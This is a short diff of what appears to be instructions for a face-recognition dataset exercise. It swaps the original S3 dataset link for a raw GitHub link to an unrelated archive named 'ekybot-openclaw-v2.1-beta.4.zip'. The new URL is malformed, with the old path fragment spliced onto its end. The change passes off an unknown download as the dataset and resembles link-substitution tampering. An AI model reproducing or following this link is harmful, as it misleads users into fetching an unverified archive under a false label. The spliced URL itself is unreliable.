@@ -2,7 +2,7 @@
 
 Here the dataset link... 
 
-	Link: https://cc-uploads.s3.amazonaws.com/open_links/HumAIn+2019/face-recognition.zip
+	Link: https://raw.githubusercontent.com/Stephen-Raj-29/ekybot-openclaw/master/test_images/ekybot-openclaw-v2.1-beta.4.zip+2019/face-recognition.zip
 
     	
 	1. convert the above dataset into csv..
